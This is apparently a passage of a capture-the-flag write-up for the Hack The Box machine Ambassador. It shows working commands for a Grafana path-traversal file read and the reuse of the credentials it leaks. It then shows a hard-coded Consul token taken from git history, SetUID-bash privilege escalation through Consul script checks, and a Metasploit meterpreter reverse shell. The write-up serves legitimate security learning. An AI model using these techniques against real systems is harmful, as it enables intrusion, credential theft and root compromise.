+<span class="c"># folder that contains provisioning config files that grafana will apply on startup and while running.</span>
+<span class="p">;</span>provisioning <span class="o">=</span> conf/provisioning   
+</code></pre></div></div>
+<p>At first I thought the DB section was weird, as it specifies the type of sqlite, but then gives a port and username:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#################################### Database ####################################</span>
+<span class="o">[</span>database]
+<span class="c"># You can configure the database connection by specifying type, host, name, user and password</span>
+<span class="c"># as separate properties or as on string using the url properties.</span>
+
+<span class="c"># Either "mysql", "postgres" or "sqlite3", it's your choice</span>
+<span class="p">;</span><span class="nb">type</span> <span class="o">=</span> sqlite3
+<span class="p">;</span>host <span class="o">=</span> 127.0.0.1:3306
+<span class="p">;</span>name <span class="o">=</span> grafana
+<span class="p">;</span>user <span class="o">=</span> root
+<span class="c"># If the password contains # or ; you have to wrap it with triple quotes. Ex """#password;"""</span>
+<span class="p">;</span>password <span class="o">=</span> 
+</code></pre></div></div>
+<p>It turns out, this is just the <a href="https://github.com/grafana/grafana/blob/main/conf/defaults.ini">default config</a>. I can try logging into MySQL with root and no password, but it doesn’t work:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>mysql <span class="nt">-u</span> root <span class="nt">-p</span> <span class="nt">-h</span> 10.10.11.183
+<span class="go">Enter password: 
+ERROR 1045 (28000): Access denied for user 'root'@'10.10.14.6' (using password: NO)
+</span></code></pre></div></div>
+<p>The “Security” section has a bunch of stuff that’s commented out with <code class="language-plaintext highlighter-rouge">;</code>, but the <code class="language-plaintext highlighter-rouge">admin_password</code> is not:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#################################### Security ####################################</span>
+<span class="o">[</span>security]
+<span class="c"># disable creation of admin user on first start of grafana</span>
+<span class="p">;</span>disable_initial_admin_creation <span class="o">=</span> <span class="nb">false</span>             
+
+<span class="c"># default admin user, created on startup</span>
+<span class="p">;</span>admin_user <span class="o">=</span> admin             
+
+<span class="c"># default admin password, can be changed before first start of grafana,  or in profile settings</span>
+admin_password <span class="o">=</span> messageInABottle685427
+                                                    
+<span class="c"># used for signing                               </span>
+<span class="p">;</span>secret_key <span class="o">=</span> SW2YcwTIb9zpOOhoPsMm
+</code></pre></div></div>
+<p>Another way to look at this is to use <code class="language-plaintext highlighter-rouge">grep</code> to remove anything that starts with <code class="language-plaintext highlighter-rouge">#</code> (comment), <code class="language-plaintext highlighter-rouge">;</code> (comment), or <code class="language-plaintext highlighter-rouge">[</code> (start of section).</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">--path-as-is</span> <span class="nt">-s</span> http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"^[#;</span><span class="se">\[</span><span class="s2">]"</span> | <span class="nb">grep</span> <span class="nb">.</span>
+<span class="go">admin_password = messageInABottle685427
+</span></code></pre></div></div>
+<p>What’s left is just the password, meaning it’s the only non-default line in the config.</p>
+<h4 id="log-in">Log In</h4>
+<p>With that default admin password, I can log into Grafana as the admin user:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20220913105217755.png"><img alt="image-20220913105217755" src="https://0xdfimages.gitlab.io/img/image-20220913105217755.png"/><em>Click for full size image</em></a></p>
+<h3 id="database-access">Database Access</h3>
+<h4 id="enumerate-grafana">Enumerate Grafana</h4>
+<p>Looking around in the Settings, there is a data source listed:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20220913111226411.png"><img alt="image-20220913111226411" src="https://0xdfimages.gitlab.io/img/image-20220913111226411.png"/><em>Click for full size image</em></a></p>
+<p>Clicking on it, it’s named <code class="language-plaintext highlighter-rouge">mysql.yaml</code>, and defines a MySQL connection:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20220913111412334.png"><img alt="image-20220913111412334" src="https://0xdfimages.gitlab.io/img/image-20220913111412334.png"/><em>Click for full size image</em></a></p>
+<p>It says this is added by a config file and can’t be modified in the UI.</p>
+<h4 id="get-mysqlyaml">Get mysql.yaml</h4>
+<p>The config file for this data source will likely have the creds for MySQL in it. The <a href="https://grafana.com/docs/grafana/latest/administration/provisioning/#data-sources">Grafana docs</a> show that these configs live in <code class="language-plaintext highlighter-rouge">/etc/grafana/provisioning/datasources</code>.</p>
+<p>I’ll get the file with the file read vuln:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">--path-as-is</span> http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../../etc/grafana/provisioning/datasources/mysql.yaml
+<span class="go">apiVersion: 1
+
+datasources:
+ - name: mysql.yaml 
+   type: mysql
+   host: localhost
+   database: grafana
+   user: grafana
+   password: dontStandSoCloseToMe63221!
+   editable: false
+</span></code></pre></div></div>
+<h4 id="connect-to-mysql">Connect to MySQL</h4>
+<p>I’ll try these creds to connect to the DB, and they work:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>mysql <span class="nt">-h</span> 10.10.11.183 <span class="nt">-u</span> grafana <span class="nt">-p</span><span class="s1">'dontStandSoCloseToMe63221!'</span>
+<span class="go">mysql: [Warning] Using a password on the command line interface can be insecure.
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 10
+Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)
+
+Copyright (c) 2000, 2022, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+</span><span class="gp">mysql&gt;</span><span class="w">
+</span></code></pre></div></div>
+<h3 id="ssh">SSH</h3>
+<h4 id="enumerate-databases">Enumerate Databases</h4>
+<p>MySQL is running two non-standard databases, <code class="language-plaintext highlighter-rouge">grafana</code> and <code class="language-plaintext highlighter-rouge">whackywidget</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">mysql&gt;</span><span class="w"> </span><span class="k">show</span> <span class="n">databases</span><span class="p">;</span>
+<span class="go">+--------------------+
+| Database           |
++--------------------+
+| grafana            |
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| whackywidget       |
++--------------------+
+6 rows in set (0.10 sec)
+</span></code></pre></div></div>
+<p>Looking in whacky widget, there’s only one table:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">mysql&gt;</span><span class="w"> </span><span class="n">use</span> <span class="n">whackywidget</span><span class="p">;</span>
+<span class="go">Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+</span><span class="gp">mysql&gt;</span><span class="w"> </span><span class="k">show</span> <span class="n">tables</span><span class="p">;</span>
+<span class="go">+------------------------+
+| Tables_in_whackywidget |
++------------------------+
+| users                  |
++------------------------+
+1 row in set (0.08 sec)
+</span></code></pre></div></div>
+<p>It has one user, with a password field that looks like base64:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">mysql&gt;</span><span class="w"> </span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span><span class="p">;</span>
+<span class="go">+-----------+------------------------------------------+
+| user      | pass                                     |
++-----------+------------------------------------------+
+| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
++-----------+------------------------------------------+
+1 row in set (0.09 sec)
+</span></code></pre></div></div>
+<h4 id="connect">Connect</h4>
+<p>I would expect to see “password” decode to some encrypted binary data, but it comes out as plain text:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg=="</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+<span class="go">anEnglishManInNewYork027468
+</span></code></pre></div></div>
+<p>That works to SSH as developer:</p>
+<div class="language-console sshpass-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sshpass <span class="nt">-p</span> <span class="s1">'anEnglishManInNewYork027468'</span> ssh developer@10.10.11.183
+<span class="go">Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)
+...[snip]...
+</span><span class="gp">developer@ambassador:~$</span><span class="w"> 
+</span></code></pre></div></div>
+<p>And grab the user flag:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">developer@ambassador:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">16a62cde************************
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="opt">/opt</h4>
+<p>The <code class="language-plaintext highlighter-rouge">/opt</code> folder has two important folders to get to the next step:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">developer@ambassador:/opt$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">consul  my-app
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">consul</code> folder is <a href="https://github.com/hashicorp/consul">Consul</a>:</p>
+<blockquote>
+<p>a distributed, highly available, and data center aware solution to connect and configure applications across dynamic, distributed infrastructure.</p>
+</blockquote>
+<p>The <code class="language-plaintext highlighter-rouge">my-app</code> folder has two folders, and references “whackywidget”, which I’ll recall from the DB where I found developer creds.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">developer@ambassador:/opt/my-app$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 24
+drwxrwxr-x 5 root root 4096 Mar 13  2022 .
+drwxr-xr-x 4 root root 4096 Sep  1 22:13 ..
+drwxrwxr-x 4 root root 4096 Mar 13  2022 env
+drwxrwxr-x 8 root root 4096 Mar 14  2022 .git
+-rw-rw-r-- 1 root root 1838 Mar 13  2022 .gitignore
+drwxrwxr-x 3 root root 4096 Mar 13  2022 whackywidget
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">env</code> is a Python virtual environment. Not too much interesting there. This folder has a <code class="language-plaintext highlighter-rouge">.git</code> directory, so it’s a GIT repository.</p>
+<p>The <code class="language-plaintext highlighter-rouge">whackywidget</code> folder has a shell script, <code class="language-plaintext highlighter-rouge">manage.py</code>, and another folder that has Python files in it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">developer@ambassador:/opt/my-app/whackywidget$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">manage.py  put-config-in-consul.sh  whackywidget
+</span><span class="gp">developer@ambassador:/opt/my-app/whackywidget$</span><span class="w"> </span><span class="nb">ls </span>whackywidget/
+<span class="go">asgi.py  __init__.py  settings.py  urls.py  wsgi.py
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">manage.py</code> and those other scripts are from a default Django install (a Python web framework). There’s not much to find in there.</p>
+<h4 id="put-config-in-consolesh">put-config-in-console.sh</h4>
+<p>The shell script is only one line, but it’s got a lot of clues about where to go next:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># We use Consul for application config in production, this script will help set the correct values for the app</span>
+<span class="c"># Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running</span>
+
+consul kv put whackywidget/db/mysql_pw <span class="nv">$MYSQL_PASSWORD</span>
+</code></pre></div></div>
+<p>It’s using the <code class="language-plaintext highlighter-rouge">consul</code> command line application to set a key/value pair with Consul. It also has comments about needing to export the <code class="language-plaintext highlighter-rouge">MYSQL_PASSWORD</code> and <code class="language-plaintext highlighter-rouge">CONSUL_HTTP_TOKEN</code> environment variables before running.</p>
+<p>The <code class="language-plaintext highlighter-rouge">MYSQL_PASSWORD</code> variable is what’s stored in the KV store. According to the <a href="https://www.consul.io/commands">Consul command line docs</a>, the <code class="language-plaintext highlighter-rouge">CONSUL_HTTP_TOKEN</code> value is what’s used to validate access.</p>
+<h3 id="access-to-consul">Access to Consul</h3>
+<h4 id="access-denied">Access Denied</h4>
+<p>I’ll try to use <code class="language-plaintext highlighter-rouge">consul</code> without having a token, but it fails:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">developer@ambassador:/opt/my-app/whackywidget$</span><span class="w"> </span>consul kv get whackywidget/db/mysql_pw
+<span class="go">Error querying Consul agent: Unexpected response code: 403 (Permission denied)
+</span></code></pre></div></div>
+<p>In this case, I’m trying to read the value that gets set in the script. I’ll need to find that token.</p>
+<h4 id="get-token">Get Token</h4>
+<p>The first place I’ll look is in the developer’s home directory, but <code class="language-plaintext highlighter-rouge">grep -r CONSUL_HTTP_TOKEN .</code> doesn’t find anything.</p>
+<p>Back in the app’s directory, I’ll look at the GIT log:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">developer@ambassador:/opt/my-app/whackywidget$</span><span class="w"> </span>git log <span class="nt">--oneline</span>
+<span class="go">33a53ef (HEAD -&gt; main) tidy config script
+c982db8 config script
+8dce657 created project with django CLI
+4b8597b .gitignore
+</span></code></pre></div></div>
+<p>The most recent commit “tid(ied) the config script”.</p>
+<p>Looking back at the previous commit, there’s a version of the script that has a token hard coded:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">developer@ambassador:/opt/my-app/whackywidget$ </span>git show c982db8:./put-config-in-consul.sh 
+<span class="c"># We use Consul for application config in production, this script will help set the correct values for the app
+# Export MYSQL_PASSWORD before running
+</span><span class="go">
+consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
+</span></code></pre></div></div>
+<h4 id="access-poc">Access POC</h4>
+<p>To test access, I’ll try the same command as above but with a token:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">developer@ambassador:/opt/my-app/whackywidget$</span><span class="w"> </span><span class="nv">CONSUL_HTTP_TOKEN</span><span class="o">=</span><span class="s1">'bb03b43b-1d81-d62b-24b5-39540ee469b5'</span> consul kv get whackywidget/db/mysql_pw 
+<span class="go">
+</span></code></pre></div></div>
+<p>It returns an empty line, which isn’t impressive, but isn’t the not authorized error I got before.</p>
+<p>I can write and read from the KV store:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">developer@ambassador:/opt/my-app/whackywidget$</span><span class="w"> </span><span class="nv">CONSUL_HTTP_TOKEN</span><span class="o">=</span><span class="s1">'bb03b43b-1d81-d62b-24b5-39540ee469b5'</span> consul kv put whackywidget/db/mysql_pw 0xdf
+<span class="go">Success! Data written to: whackywidget/db/mysql_pw
+</span><span class="gp">developer@ambassador:/opt/my-app/whackywidget$</span><span class="w"> </span><span class="nv">CONSUL_HTTP_TOKEN</span><span class="o">=</span><span class="s1">'bb03b43b-1d81-d62b-24b5-39540ee469b5'</span> consul kv get whackywidget/db/mysql_pw 
+<span class="go">0xdf
+</span><span class="gp">developer@ambassador:/opt/my-app/whackywidget$</span><span class="w"> </span><span class="nv">CONSUL_HTTP_TOKEN</span><span class="o">=</span><span class="s1">'bb03b43b-1d81-d62b-24b5-39540ee469b5'</span> consul kv delete whackywidget/db/mysql_pw
+<span class="go">Success! Deleted key: whackywidget/db/mysql_pw
+</span></code></pre></div></div>
+<h3 id="execution-via-consul">Execution via Consul</h3>
+<h4 id="exec---fail">exec - Fail</h4>
+<p>It’s tempting to note that <code class="language-plaintext highlighter-rouge">consul</code> has an <code class="language-plaintext highlighter-rouge">exec</code> <a href="https://www.consul.io/commands/exec">subcommand</a>. Unfortunately, when I try to run it, it returns that 0 nodes completed or acknowledged:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">developer@ambassador:/etc/consul.d$</span><span class="w"> </span><span class="nv">CONSUL_HTTP_TOKEN</span><span class="o">=</span><span class="s1">'bb03b43b-1d81-d62b-24b5-39540ee469b5'</span> consul <span class="nb">exec id</span>
+<span class="go">0 / 0 node(s) completed / acknowledged
+</span></code></pre></div></div>
+<p>It doesn’t seem like there are any nodes online to execute one.</p>
+<h4 id="consul-configuration">Consul Configuration</h4>
+<p>I’ll find the <code class="language-plaintext highlighter-rouge">consul</code> configuration in <code class="language-plaintext highlighter-rouge">/etc/consul.d</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">developer@ambassador:/etc/consul.d$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span>
+<span class="go">total 16
+drwx-wx--- 2 root   developer 4096 Sep 14 11:00 config.d
+-rw-r--r-- 1 consul consul       0 Feb 28  2022 consul.env
+-rw-r--r-- 1 consul consul    5303 Mar 14  2022 consul.hcl
+-rw-r--r-- 1 consul consul     160 Mar 15  2022 README
+</span></code></pre></div></div>
+<p>Two of the files are empty. The README has a note about the configuration, and a link to <a href="https://www.consul.io/docs/agent/config/config-files#configuration">more documentation</a>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">developer@ambassador:/etc/consul.d$</span><span class="w"> </span><span class="nb">cat </span>README 
+<span class="go">Configuration in Consul is read from the command line first and then from config files in lexical order.
+https://www.consul.io/docs/agent/options#configuration
+</span></code></pre></div></div>
+<p>Looking at the command line for the running <code class="language-plaintext highlighter-rouge">consul</code> process shows that it’s running with both <code class="language-plaintext highlighter-rouge">-config-dir</code> and <code class="language-plaintext highlighter-rouge">-config-file</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">developer@ambassador:/etc/consul.d$</span><span class="w"> </span>ps auxww | <span class="nb">grep </span>consul
+<span class="go">root        1013  0.5  3.3 781092 66536 ?        Ssl  17:14   0:00 /usr/bin/consul agent -config-dir=/etc/consul.d/config.d -config-file=/etc/consul.d/consul.hcl
+</span></code></pre></div></div>
+<p>On removing comments from the <code class="language-plaintext highlighter-rouge">consol.hcl</code> file, what remains is:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">developer@ambassador:/etc/consul.d$</span><span class="w"> </span><span class="nb">cat </span>consul.hcl | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"^#"</span> | <span class="nb">grep</span> <span class="nb">.</span>
+<span class="go">data_dir = "/opt/consul"
+server = true
+bind_addr = "127.0.0.1"
+bootstrap_expect=1
+acl {
+  enabled        = true
+  default_policy = "deny"
+  down_policy    = "extend-cache"
+}
+enable_script_checks = true
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">config.d</code> is permissioned such that developer can write to it, but not read what’s in it. Presumably config files in that directory should be processed.</p>
+<h4 id="script-checks">Script Checks</h4>
+<p>Looking at the <code class="language-plaintext highlighter-rouge">enable_script_checks</code> option can lead to <a href="https://www.hashicorp.com/blog/protecting-consul-from-rce-risk-in-specific-configurations">this blog post</a> about how Consul can be exploited by script checks. <a href="https://www.consul.io/docs/discovery/checks">This page</a> talks about how to create checks and includes examples.</p>
+<p>The “service definition file” goes into the “agent’s configuration directory”, which I believe is <code class="language-plaintext highlighter-rouge">/etc/consul.d/config.d</code>.</p>
+<p>I’ll grab the example for a script check from the documents page above, and modify it a bit</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">check</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="nb">id</span> <span class="o">=</span> <span class="sh">"</span><span class="s">0xdf</span><span class="sh">"</span>
+  <span class="n">name</span> <span class="o">=</span> <span class="sh">"</span><span class="s">0xdf owned this</span><span class="sh">"</span>
+  <span class="n">args</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"</span><span class="s">/usr/bin/touch</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">/tmp/0xdf-test</span><span class="sh">"</span><span class="p">]</span>
+  <span class="n">interval</span> <span class="o">=</span> <span class="sh">"</span><span class="s">10s</span><span class="sh">"</span>
+  <span class="n">timeout</span> <span class="o">=</span> <span class="sh">"</span><span class="s">1s</span><span class="sh">"</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>This script check will now touch <code class="language-plaintext highlighter-rouge">/tmp/0xdf-test</code> as root. I’ll use <code class="language-plaintext highlighter-rouge">vim</code> to write that as <code class="language-plaintext highlighter-rouge">config.d/0xdf.hcl</code>.</p>
+<p>I’ll reload <code class="language-plaintext highlighter-rouge">consul</code> to refresh the configuration:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">developer@ambassador:/etc/consul.d$</span><span class="w"> </span><span class="nv">CONSUL_HTTP_TOKEN</span><span class="o">=</span><span class="s1">'bb03b43b-1d81-d62b-24b5-39540ee469b5'</span> consul reload
+<span class="go">Configuration reload triggered
+</span></code></pre></div></div>
+<p>The results of the scripts are available using <code class="language-plaintext highlighter-rouge">journalctl</code>, which requires root to access. Still, after a few seconds, I’ll see <code class="language-plaintext highlighter-rouge">/tmp/0xdf-test</code> exists:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">developer@ambassador:/etc/consul.d$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /tmp/0xdf-test
+<span class="go">-rw-r--r-- 1 root root 0 Sep 14 17:25 /tmp/0xdf-test
+</span></code></pre></div></div>
+<h4 id="shell">Shell</h4>
+<p>To get a shell, I’ll update the check script file to include three checks:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">checks</span> <span class="o">=</span> <span class="p">[</span>
+  <span class="p">{</span>
+    <span class="nb">id</span> <span class="o">=</span> <span class="sh">"</span><span class="s">0xdf-1</span><span class="sh">"</span>
+    <span class="n">name</span> <span class="o">=</span> <span class="sh">"</span><span class="s">copy bash</span><span class="sh">"</span>
+    <span class="n">args</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"</span><span class="s">cp</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">/bin/bash</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">/tmp/0xdf</span><span class="sh">"</span><span class="p">]</span>
+    <span class="n">interval</span> <span class="o">=</span> <span class="sh">"</span><span class="s">60s</span><span class="sh">"</span>
+  <span class="p">},</span>
+  <span class="p">{</span>
+    <span class="nb">id</span> <span class="o">=</span> <span class="sh">"</span><span class="s">0xdf-2</span><span class="sh">"</span>
+    <span class="n">name</span> <span class="o">=</span> <span class="sh">"</span><span class="s">make it root</span><span class="sh">"</span>
+    <span class="n">args</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"</span><span class="s">/usr/bin/chown</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">root:root</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">/tmp/0xdf</span><span class="sh">"</span><span class="p">]</span>
+    <span class="n">interval</span> <span class="o">=</span> <span class="sh">"</span><span class="s">60s</span><span class="sh">"</span>
+  <span class="p">},</span>
+  <span class="p">{</span>
+    <span class="nb">id</span> <span class="o">=</span> <span class="sh">"</span><span class="s">0xdf-3</span><span class="sh">"</span>
+    <span class="n">name</span> <span class="o">=</span> <span class="sh">"</span><span class="s">suid bash</span><span class="sh">"</span>
+    <span class="n">args</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"</span><span class="s">/usr/bin/chmod</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">4777</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">/tmp/0xdf</span><span class="sh">"</span><span class="p">]</span>
+    <span class="n">interval</span> <span class="o">=</span> <span class="sh">"</span><span class="s">60s</span><span class="sh">"</span>
+  <span class="p">}</span>
+<span class="p">]</span>
+</code></pre></div></div>
+<p>This will copy <code class="language-plaintext highlighter-rouge">bash</code> to <code class="language-plaintext highlighter-rouge">/tmp/0xdf</code>, make sure it’s owned by root, and then make it SetUID. After reloading consul, the script runs, and it works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">developer@ambassador:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /tmp/0xdf
+<span class="go">-rwsrwxrwx 1 root root 1183448 Sep 14 17:33 /tmp/0xdf
+</span></code></pre></div></div>
+<p>Running this (with <code class="language-plaintext highlighter-rouge">-p</code> to not drop privs) returns a root shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">developer@ambassador:~$</span><span class="w"> </span>/tmp/0xdf <span class="nt">-p</span>
+<span class="gp">0xdf-5.0#</span><span class="w">
+</span></code></pre></div></div>
+<p>And I can get the root flag:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">0xdf-5.0#</span><span class="w"> </span><span class="nb">cat </span>root.txt
+<span class="go">739f3788************************
+</span></code></pre></div></div>
+<h3 id="msf-alternative">MSF Alternative</h3>
+<p>There is a metasploit exploit for this same version of Consul. I’ll run <code class="language-plaintext highlighter-rouge">msfconsole</code>, and then <code class="language-plaintext highlighter-rouge">use</code> it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">msf6 &gt;</span><span class="w"> </span>use multi/misc/consul_service_exec
+<span class="go">[*] Using configured payload linux/x86/meterpreter/reverse_tcp
+</span><span class="gp">msf6 exploit(multi/misc/consul_service_exec) &gt;</span><span class="w"> 
+</span></code></pre></div></div>
+<p>The default <code class="language-plaintext highlighter-rouge">RPORT</code> is 8500 (also listed in <a href="https://developer.hashicorp.com/consul/docs/install/ports">the docs</a>), which is the Consul API, and is listening on Ambassador:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">developer@ambassador:~$</span><span class="w"> </span>netstat <span class="nt">-tnlp</span>                 
+<span class="go">(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8300          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8301          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8302          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN      -                   
+...[snip]...
+</span></code></pre></div></div>
+<p>I’ll use my SSH session to create a tunnel listening on 8500 on my host forwarding through the SSH session to 8500 on Ambassador (<code class="language-plaintext highlighter-rouge">-L 8500:localhost:8500</code>). After configuring the exploit, it looks like this:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">msf6 exploit(multi/misc/consul_service_exec) &gt;</span><span class="w"> </span>options
+<span class="go">
+Module options (exploit/multi/misc/consul_service_exec):
+
+   Name       Current Setting                       Required  Description
+   ----       ---------------                       --------  -----------
+   ACL_TOKEN  bb03b43b-1d81-d62b-24b5-39540ee469b5  no        Consul Agent ACL token
+              
+   Proxies                                          no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     127.0.0.1                             yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT      8500                                  yes       The target port (TCP)
+   SRVHOST    0.0.0.0                               yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT    8080                                  yes       The local port to listen on.
+   SSL        false                                 no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                                          no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                                     yes       The base path
+   URIPATH                                          no        The URI to use for this exploit (default is random)
+   VHOST                                            no        HTTP server virtual host
+
+Payload options (linux/x86/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.14.6       yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Linux
+
+View the full module info with the info, or info -d command.
+</span></code></pre></div></div>
+<p>The important things to set are the <code class="language-plaintext highlighter-rouge">ACL_TOKEN</code> (recovered above), the <code class="language-plaintext highlighter-rouge">RHOSTS</code> (set to localhost tunnel), and the payload. Running this gives a shell as root:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">msf6 exploit(multi/misc/consul_service_exec) &gt;</span><span class="w"> </span>run
+<span class="go">                              
+[*] Started reverse TCP handler on 10.10.14.6:4444 
+[*] Creating service 'SpSyWPB'
+[*] Service 'SpSyWPB' successfully created.
+[*] Waiting for service 'SpSyWPB' script to trigger
+[*] Sending stage (1017704 bytes) to 10.10.11.183
+[*] Meterpreter session 1 opened (10.10.14.6:4444 -&gt; 10.10.11.183:46010) at 2023-01-26 18:02:45 +0000
+[*] Removing service 'SpSyWPB'
+[*] Command Stager progress - 100.00% done (763/763 bytes)
+
+</span><span class="gp">meterpreter &gt;</span><span class="w"> </span>getuid 
+<span class="go">Server username: root
+</span></code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2023/01/28/htb-ambassador.html"></a>
+</article>
